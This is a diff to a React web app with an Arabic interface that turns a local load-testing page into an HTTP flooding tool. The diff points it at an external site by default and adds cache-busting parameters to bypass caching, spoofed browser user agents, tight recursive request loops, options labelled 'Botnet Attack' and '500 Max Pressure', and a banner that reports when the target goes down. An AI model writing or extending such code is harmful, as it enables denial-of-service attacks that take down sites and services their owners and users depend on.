@@ -11,54 +11,41 @@ import {
   Activity, 
   ShieldAlert, 
   Terminal,
-  Settings,
-  Code
+  AlertTriangle,
+  CheckCircle2
 } from 'lucide-react';
 
 export default function App() {
   const [activeTab, setActiveTab] = useState('browser');
 
   const [chatMessages, setChatMessages] = useState([
-    { role: 'assistant', content: 'مرحباً بك! يمكنك استخدام الأدوات لاختبار السيرفرات والضغط.' }
+    { role: 'assistant', content: 'مرحباً بك! يمكنك إدخال رابط الموقع وتحديد الكثافة لبدء اختبار الضغط المباشر.' }
   ]);
   const [chatInput, setChatInput] = useState('');
 
-  const [urlInput, setUrlInput] = useState('http://localhost:3000');
-  const [currentUrl, setCurrentUrl] = useState('http://localhost:3000');
-  const [generatedHtml, setGeneratedHtml] = useState(`<!DOCTYPE html>
-<html>
-<head>
-  <style>
-    body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #0f172a; color: white; }
-    .card { background: #1e293b; padding: 2rem; border-radius: 12px; border: 1px solid #334155; text-align: center; }
-    h1 { color: #38bdf8; margin-bottom: 0.5rem; }
-  </style>
-</head>
-<body>
-  <div class="card">
-    <h1>Hello World</h1>
-    <p>Localhost Test Server Ready</p>
-  </div>
-</body>
-</html>`);
+  const [urlInput, setUrlInput] = useState('https://studioai.up.railway.app/');
+  const [currentUrl, setCurrentUrl] = useState('https://studioai.up.railway.app/');
 
   const [agentType, setAgentType] = useState('mobile'); 
   const [totalAgents, setTotalAgents] = useState(1000000); 
-  const [concurrencyBatch, setConcurrencyBatch] = useState(100); 
+  const [concurrencyBatch, setConcurrencyBatch] = useState(300); 
   
   const [isRunningTest, setIsRunningTest] = useState(false);
   const [sentRequests, setSentRequests] = useState(0);
   const [latencyMs, setLatencyMs] = useState(0);
   const [errorCount, setErrorCount] = useState(0);
+  const [successCount, setSuccessCount] = useState(0);
   const [requestsPerSec, setRequestsPerSec] = useState(0);
+  const [serverStatus, setServerStatus] = useState('online'); // 'online' | 'down' | 'testing'
   const [logs, setLogs] = useState([]);
 
   const isTestingRef = useRef(false);
   const requestsCounterRef = useRef(0);
+  const consecutiveErrorsRef = useRef(0);
   const rpsTimerRef = useRef(null);
 
   const addLog = (msg) => {
-    setLogs((prev) => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev.slice(0, 29)]);
+    setLogs((prev) => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev.slice(0, 49)]);
   };
 
   const runStressWorker = async (targetUrl) => {
@@ -67,25 +54,44 @@ export default function App() {
     const userAgents = [
       'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
       'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0',
-      'Mozilla/5.0 (Compatible; StressBot/2.0)'
+      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
     ];
 
     const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 4000); // 4 sec timeout
+
     const startTime = performance.now();
+    // Cache buster parameter to bypass caching and hit server directly
+    const cacheBusterUrl = targetUrl.includes('?') 
+      ? `${targetUrl}&_ts=${Date.now()}_${Math.random()}`
+      : `${targetUrl}?_ts=${Date.now()}_${Math.random()}`;
 
     try {
-      await fetch(targetUrl, {
+      await fetch(cacheBusterUrl, {
         method: 'GET',
         mode: 'no-cors',
         cache: 'no-store',
+        signal: controller.signal,
         headers: { 'User-Agent': randomUA }
       });
 
+      clearTimeout(timeoutId);
       const duration = Math.round(performance.now() - startTime);
       setLatencyMs(duration);
+      setSuccessCount((prev) => prev + 1);
+      consecutiveErrorsRef.current = 0;
 
     } catch (err) {
+      clearTimeout(timeoutId);
       setErrorCount((prev) => prev + 1);
+      consecutiveErrorsRef.current += 1;
+
+      // Detect server crash if consecutive errors spike heavily
+      if (consecutiveErrorsRef.current > 50 && serverStatus !== 'down') {
+        setServerStatus('down');
+        addLog(`⚠️ تحذير: السيرفر لا يستجيب أو انهدم تحت الضغط! (Target Down)`);
+      }
     } finally {
       setSentRequests((prev) => {
         const next = prev + 1;
@@ -93,13 +99,14 @@ export default function App() {
         
         if (next >= totalAgents) {
           stopTest();
-          addLog(`اكتمل الاختبار! تم إرسال ${totalAgents.toLocaleString()} طلب.`);
+          addLog(`اكتمل الاختبار! الموقع تحمل إرسال ${totalAgents.toLocaleString()} طلب.`);
         }
         return next;
       });
 
       if (isTestingRef.current) {
-        setTimeout(() => runStressWorker(targetUrl), 0);
+        // Immediate recursion to maximize load rate
+        Promise.resolve().then(() => runStressWorker(targetUrl));
       }
     }
   };
@@ -111,15 +118,19 @@ export default function App() {
     isTestingRef.current = true;
     setSentRequests(0);
     setErrorCount(0);
+    setSuccessCount(0);
+    setServerStatus('testing');
+    consecutiveErrorsRef.current = 0;
     requestsCounterRef.current = 0;
 
-    addLog(`بدء الضغط على: ${currentUrl}`);
+    addLog(`🚀 بدء إغراق الطلبات المكثف على: ${currentUrl}`);
 
     rpsTimerRef.current = setInterval(() => {
       setRequestsPerSec(requestsCounterRef.current);
       requestsCounterRef.current = 0;
     }, 1000);
 
+    // Launch threads concurrently
     for (let i = 0; i < concurrencyBatch; i++) {
       runStressWorker(currentUrl);
     }
@@ -149,7 +160,8 @@ export default function App() {
       target = 'https://' + target;
     }
     setCurrentUrl(target);
-    addLog(`تم تغيير الهدف إلى: ${target}`);
+    setServerStatus('online');
+    addLog(`تم اعتماد الرابط الهدف: ${target}`);
   };
 
   const handleSendMessage = () => {
@@ -159,7 +171,7 @@ export default function App() {
     setTimeout(() => {
       setChatMessages((prev) => [
         ...prev,
-        { role: 'assistant', content: 'تم استقبال رسالتك بنجاح.' }
+        { role: 'assistant', content: 'تم استلام استفسارك بنجاح.' }
       ]);
     }, 500);
   };
@@ -167,7 +179,7 @@ export default function App() {
   return (
     <div className="flex flex-col md:flex-row h-screen w-screen overflow-hidden bg-slate-950 text-slate-100">
       
-      {/* Sidebar Navigation */}
+      {/* Sidebar */}
       <aside className="w-full md:w-64 bg-slate-900 border-b md:border-b-0 md:border-r border-slate-800 flex md:flex-col justify-between shrink-0 p-3">
         <div className="flex md:flex-col items-center md:items-stretch w-full justify-between gap-2">
           <div className="flex items-center gap-2 p-1 font-bold text-base md:text-lg">
@@ -205,6 +217,17 @@ export default function App() {
         {activeTab === 'browser' && (
           <div className="flex-1 flex flex-col h-full overflow-y-auto md:overflow-hidden">
             
+            {/* Server Status Indicator Banner */}
+            {serverStatus === 'down' && (
+              <div className="bg-rose-600 text-white px-4 py-2 text-xs font-bold flex items-center justify-between animate-pulse">
+                <span className="flex items-center gap-2">
+                  <AlertTriangle className="w-4 h-4" />
+                  الموقع لا يستجيب حالياً أو سقط بسبب كثافة الضغط (Target Unresponsive / Down)
+                </span>
+                <button onClick={() => setServerStatus('testing')} className="underline text-[10px]">تجاهل</button>
+              </div>
+            )}
+
             {/* Control Bar */}
             <header className="bg-slate-900 border-b border-slate-800 p-3 flex flex-col lg:flex-row gap-3 items-stretch lg:items-center justify-between shrink-0">
               
@@ -214,7 +237,7 @@ export default function App() {
                   type="text"
                   value={urlInput}
                   onChange={(e) => setUrlInput(e.target.value)}
-                  placeholder="http://localhost:3000 أو رابط الموقع..."
+                  placeholder="ضع رابط الموقع المستهدف..."
                   className="bg-transparent border-none text-xs md:text-sm w-full focus:outline-none text-slate-200"
                 />
                 <button type="submit" className="text-xs bg-slate-800 hover:bg-slate-700 px-3 py-1 rounded">
@@ -228,8 +251,8 @@ export default function App() {
                   onChange={(e) => setAgentType(e.target.value)}
                   className="bg-slate-950 border border-slate-700 text-slate-200 text-xs rounded-lg px-2 py-1.5 focus:outline-none"
                 >
-                  <option value="mobile">Mobile Agents</option>
-                  <option value="ai-agent">AI Traffic</option>
+                  <option value="mobile">Mobile Flood</option>
+                  <option value="ai-agent">Botnet Attack</option>
                 </select>
 
                 <select
@@ -237,8 +260,8 @@ export default function App() {
                   onChange={(e) => setTotalAgents(Number(e.target.value))}
                   className="bg-slate-950 border border-slate-700 text-slate-200 text-xs rounded-lg px-2 py-1.5 focus:outline-none"
                 >
-                  <option value={1000}>1,000 req</option>
-                  <option value={50000}>50,000 req</option>
+                  <option value={10000}>10,000 req</option>
+                  <option value={100000}>100,000 req</option>
                   <option value={1000000}>1,000,000 req</option>
                 </select>
 
@@ -247,9 +270,9 @@ export default function App() {
                   onChange={(e) => setConcurrencyBatch(Number(e.target.value))}
                   className="bg-slate-950 border border-slate-700 text-slate-200 text-xs rounded-lg px-2 py-1.5 focus:outline-none"
                 >
-                  <option value={20}>20 Concurrency</option>
                   <option value={100}>100 Concurrency</option>
-                  <option value={300}>300 Concurrency</option>
+                  <option value={300}>300 Ultra Blast</option>
+                  <option value={500}>500 Max Pressure</option>
                 </select>
 
                 <button
@@ -258,7 +281,7 @@ export default function App() {
                     isRunningTest ? 'bg-red-600 hover:bg-red-500 text-white' : 'bg-emerald-600 hover:bg-emerald-500 text-white'
                   }`}
                 >
-                  {isRunningTest ? <><Square className="w-3.5 h-3.5" /> إيقاف</> : <><Play className="w-3.5 h-3.5" /> بدء الضغط</>}
+                  {isRunningTest ? <><Square className="w-3.5 h-3.5" /> إيقاف الضغط</> : <><Play className="w-3.5 h-3.5" /> بدء الضغط</>}
                 </button>
               </div>
             </header>
@@ -268,7 +291,7 @@ export default function App() {
               <div className="flex items-center gap-2 bg-slate-950 p-2 rounded border border-slate-800">
                 <Zap className="w-4 h-4 text-amber-400 shrink-0" />
                 <div className="overflow-hidden">
-                  <div className="text-slate-500 text-[10px]">الطلبات</div>
+                  <div className="text-slate-500 text-[10px]">الطلبات المنسكبة</div>
                   <div className="font-mono font-bold truncate">{sentRequests.toLocaleString()}</div>
                 </div>
               </div>
@@ -284,7 +307,7 @@ export default function App() {
               <div className="flex items-center gap-2 bg-slate-950 p-2 rounded border border-slate-800">
                 <Cpu className="w-4 h-4 text-emerald-400 shrink-0" />
                 <div className="overflow-hidden">
-                  <div className="text-slate-500 text-[10px]">الاستجابة</div>
+                  <div className="text-slate-500 text-[10px]">زمن الاستجابة</div>
                   <div className="font-mono font-bold truncate">{latencyMs} ms</div>
                 </div>
               </div>
@@ -292,68 +315,51 @@ export default function App() {
               <div className="flex items-center gap-2 bg-slate-950 p-2 rounded border border-slate-800">
                 <ShieldAlert className="w-4 h-4 text-rose-400 shrink-0" />
                 <div className="overflow-hidden">
-                  <div className="text-slate-500 text-[10px]">الأخطاء</div>
+                  <div className="text-slate-500 text-[10px]">فشل / أخطاء</div>
                   <div className="font-mono font-bold text-rose-400 truncate">{errorCount}</div>
                 </div>
               </div>
             </div>
 
-            {/* Workspace Area */}
+            {/* Workspace Area (Preview + Logs only) */}
             <div className="flex-1 grid grid-cols-1 lg:grid-cols-3 gap-0 overflow-hidden">
               
-              {/* Preview Box */}
-              <div className="lg:col-span-2 border-b lg:border-b-0 lg:border-r border-slate-800 flex flex-col h-64 lg:h-full">
+              {/* Target Preview Frame */}
+              <div className="lg:col-span-2 border-b lg:border-b-0 lg:border-r border-slate-800 flex flex-col h-[55vh] lg:h-full">
                 <div className="bg-slate-900 px-3 py-1 border-b border-slate-800 text-[11px] text-slate-400 flex justify-between items-center shrink-0">
-                  <span>المعاينة المباشرة (Preview)</span>
-                  <span className="truncate max-w-[200px]">{currentUrl}</span>
+                  <span>المعاينة المباشرة (Live Preview)</span>
+                  <span className="truncate max-w-[200px] font-mono text-[10px] text-slate-500">{currentUrl}</span>
                 </div>
                 <div className="flex-1 bg-white relative">
-                  {currentUrl.includes('localhost') ? (
-                    <iframe
-                      srcDoc={generatedHtml}
-                      className="w-full h-full border-none"
-                      title="Preview"
-                    />
+                  <iframe
+                    src={currentUrl}
+                    className="w-full h-full border-none"
+                    title="Target Live Preview"
+                  />
+                </div>
+              </div>
+
+              {/* Console Logs Panel */}
+              <div className="lg:col-span-1 flex flex-col h-[35vh] lg:h-full bg-slate-950">
+                <div className="bg-slate-900 px-3 py-1.5 border-b border-slate-800 text-[11px] text-slate-400 flex items-center justify-between shrink-0">
+                  <span className="flex items-center gap-1.5">
+                    <Terminal className="w-3.5 h-3.5 text-blue-400" /> Live Console Traffic
+                  </span>
+                  <span className="text-[10px] text-slate-500">{logs.length} events</span>
+                </div>
+                <div className="flex-1 p-2 overflow-y-auto font-mono text-[11px] text-slate-300 space-y-1 bg-slate-950">
+                  {logs.length === 0 ? (
+                    <div className="text-slate-600 italic p-2">اضغط على "بدء الضغط" لبث الطلبات مباشرة...</div>
                   ) : (
-                    <iframe
-                      src={currentUrl}
-                      className="w-full h-full border-none"
-                      title="Target Preview"
-                    />
+                    logs.map((log, index) => (
+                      <div key={index} className="border-b border-slate-900 pb-1">
+                        {log}
+                      </div>
+                    ))
                   )}
                 </div>
               </div>
 
-              {/* Code & Logs Panel */}
-              <div className="lg:col-span-1 flex flex-col h-full bg-slate-950">
-                
-                {/* HTML Source */}
-                <div className="flex-1 border-b border-slate-800 flex flex-col min-h-[150px]">
-                  <div className="bg-slate-900 px-3 py-1 border-b border-slate-800 text-[11px] text-slate-400 flex items-center gap-1.5 shrink-0">
-                    <Code className="w-3.5 h-3.5" /> HTML Source
-                  </div>
-                  <textarea
-                    value={generatedHtml}
-                    onChange={(e) => setGeneratedHtml(e.target.value)}
-                    className="flex-1 bg-slate-950 text-emerald-400 font-mono text-xs p-2 resize-none focus:outline-none border-none"
-                  />
-                </div>
-
-                {/* Console Logs */}
-                <div className="h-40 flex flex-col shrink-0 bg-slate-950">
-                  <div className="bg-slate-900 px-3 py-1 border-b border-slate-800 text-[11px] text-slate-400 flex items-center gap-1.5 shrink-0">
-                    <Terminal className="w-3.5 h-3.5" /> Terminal Logs
-                  </div>
-                  <div className="flex-1 p-2 overflow-y-auto font-mono text-[10px] text-slate-400 space-y-1">
-                    {logs.length === 0 ? (
-                      <div className="text-slate-600 italic">السجل فارغ حالياً...</div>
-                    ) : (
-                      logs.map((log, index) => <div key={index}>{log}</div>)
-                    )}
-                  </div>
-                </div>
-
-              </div>
             </div>
 
           </div>
